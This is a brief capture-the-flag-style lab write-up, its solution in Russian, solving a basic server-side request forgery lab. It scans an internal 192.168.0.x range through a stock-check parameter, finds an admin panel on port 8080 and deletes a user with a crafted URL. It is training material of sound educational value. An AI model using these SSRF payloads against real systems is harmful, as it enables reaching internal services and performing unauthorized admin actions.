# Lab: Basic SSRF against another back-end system

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.

## Решение
Заряжаю интрудер на перебор 0-255:
`stockApi=http://192.168.0.§0§:8080`

Запрос с параметром `stockApi=http://192.168.0.86:8080` возвращается с ошибой 404:

```
HTTP/2 404 Not Found
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11

"Not Found"
```
Добавляю к URL /admin: `stockApi=http://192.168.0.86:8080/admin`. В ответ приходит админский интерфейс:
```
<section>
    <h1>Users</h1>
    <div>
        <span>wiener - </span>
        <a href="/http://192.168.0.86:8080/admin/delete?username=wiener">Delete</a>
    </div>
    <div>
        <span>carlos - </span>
        <a href="/http://192.168.0.86:8080/admin/delete?username=carlos">Delete</a>
    </div>
</section>
```
`stockApi=http://192.168.0.86:8080/admin/delete?username=carlos`

Задание выполнено.
